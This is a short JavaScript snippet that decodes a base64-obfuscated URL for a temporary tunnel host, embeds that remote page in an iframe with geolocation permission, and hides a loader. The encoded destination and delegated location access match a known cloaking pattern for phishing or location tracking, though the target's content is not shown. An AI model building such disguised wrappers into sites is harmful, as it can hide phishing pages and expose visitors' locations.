(function() {
    const base64Url = "aHR0cHM6Ly9nb2Fscy1pbmctbWVyZ2UtZXhwZXJpbWVudC50cnljbG91ZGZsYXJlLmNvbQ=="; 
    
    try {
        const targetUrl = atob(base64Url.trim());
        const container = document.getElementById("app_container");
        if (!container) return;

        const ifrm = document.createElement("iframe");
        ifrm.src = targetUrl;
        ifrm.id = "_view_frame";
        ifrm.className = "_view_frame"; 
        ifrm.allow = "geolocation"; 
        ifrm.loading = "eager"; // دستور به مرورگر برای لود سریع


        container.appendChild(ifrm);
        
        const loader = document.getElementById('loader');
        if (loader) {
    
            setTimeout(() => {
                loader.classList.add('hidden');
                ifrm.classList.add('loaded');
            }, 500); 
        }

    } catch (err) {
        console.error("Error decoding URL:", err);
    }
})();
